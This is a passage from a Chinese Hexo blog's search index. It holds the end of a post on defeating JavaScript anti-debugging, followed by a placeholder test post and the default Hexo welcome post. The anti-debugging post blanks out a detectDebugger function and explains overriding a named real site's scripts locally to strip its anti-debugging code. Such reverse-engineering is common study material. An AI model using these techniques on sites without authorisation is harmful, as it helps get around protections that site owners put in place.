将检测调试器的函数置空</span><br>detectDebugger = <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) &#123;&#125;;<br><br><span class="hljs-comment">// 调用检测调试器的函数</span><br><span class="hljs-title function_">detectDebugger</span>();<br></code></pre></td></tr></table></figure><p>在这个示例中，原本用于检测调试器的 <code>detectDebugger</code> 函数被重新赋值为空函数，从而使得检测调试器的功能失效。当调试器尝试调用 <code>detectDebugger</code> 函数时，实际上调用的是空函数，不会触发任何反调试机制。</p><h3 id="本地覆盖法"><a href="#本地覆盖法" class="headerlink" title="本地覆盖法"></a>本地覆盖法</h3><p><a href="https://www.aqistudy.cn/">https://www.aqistudy.cn/</a></p><p>来尝试一下这个网站，会发现打开该网站之后无法调试</p><p><img src="/./../../images/js%E5%8F%8D%E8%B0%83%E8%AF%95/image-20230714114408289.png" alt="image-20230714114408289"></p><p>F12，右击都没办法使用</p><p><img src="/./../../images/js%E5%8F%8D%E8%B0%83%E8%AF%95/image-20230714114520258.png" alt="image-20230714114520258"></p><p>在这里进入管理者工具之后也是进入了断点</p><p><img src="/./../../images/js%E5%8F%8D%E8%B0%83%E8%AF%95/image-20230714114612618.png" alt="image-20230714114612618"></p><p>经过一系列操作也是没办法进行调试，该如何解决？</p><p><img src="/./../../images/js%E5%8F%8D%E8%B0%83%E8%AF%95/image-20230714120033232.png" alt="image-20230714120033232"></p><p>注意看这里，浏览器基本上都有这个覆盖，就使用本地的js文件代替网站js文件，思路就是先将页面导出来，去掉反调试代码，进行覆盖</p><p><img src="/./../../images/js%E5%8F%8D%E8%B0%83%E8%AF%95/image-20230714120448762.png" alt="image-20230714120448762"></p><p>选择之后有一个允许或拒绝的提示，允许一下就好</p><p>然后就是将带有反调试代码的文件保存到本地修改，一般是js文件或者脚本文件</p><p><img src="/./../../images/js%E5%8F%8D%E8%B0%83%E8%AF%95/image-20230714121332170.png" alt="image-20230714121332170"></p><p>思路是这样，但是要改的地方蛮多的我就不一一展示了，感兴趣的朋友可以研究研究</p>]]></content>
    
    
    <categories>
      
      <category>网络安全</category>
      
      <category>0x02-web攻防</category>
      
      <category>0x10-js应用</category>
      
    </categories>
    
    
    <tags>
      
      <tag>web攻防</tag>
      
      <tag>网络安全</tag>
      
      <tag>js逆向</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>test</title>
    <link href="/2023/07/11/test/"/>
    <url>/2023/07/11/test/</url>
    
    <content type="html"><![CDATA[<p>这是一个测试文档</p><h2 id="测试h2"><a href="#测试h2" class="headerlink" title="测试h2"></a>测试h2</h2><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">hello</span><br></code></pre></td></tr></table></figure><p>很奇怪，为什么会这样</p><p>贴一张图试试</p><p><img src="/../images/test/20230711054548592.png" alt="20230711054548592"></p><p><img src="/./../images/test/image-20230711182636059.png" alt="image-20230711182636059"></p><p><img src="/../images/test/image-20230711182021908.png" alt="image-20230711182021908"></p>]]></content>
    
    
    <categories>
      
      <category>网络安全</category>
      
      <category>0x01-test</category>
      
    </categories>
    
    
    <tags>
      
      <tag>随笔</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Hello World</title>
    <link href="/2023/06/21/hello-world/"/>
    <url>/2023/06/21/hello-world/</url>
    
    <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo new <span class="hljs-string">&quot;My New Post&quot;</span><br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo server<br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo generate<br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo deploy<br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
    
    
    <categories>
      
      <category>网络安全</category>
      
      <category>0x01-test</category>
      
    </categories>
    
    
  </entry>
  
  
  
  
</search>
